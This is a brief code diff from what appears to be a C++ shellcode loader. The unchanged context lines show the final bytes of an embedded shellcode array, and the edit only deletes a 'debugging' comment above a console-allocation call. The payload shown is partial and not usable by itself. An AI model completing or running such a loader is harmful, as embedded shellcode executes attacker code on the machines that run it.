@@ -42,7 +42,7 @@ unsigned char shellcode[] =
                         "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                         "\xff\xd5";
 int main() {
-    // Allocate a console for debugging
+   
     if (!AllocConsole()) {
         std::cerr << "Failed to allocate console" << std::endl;
         return -1;
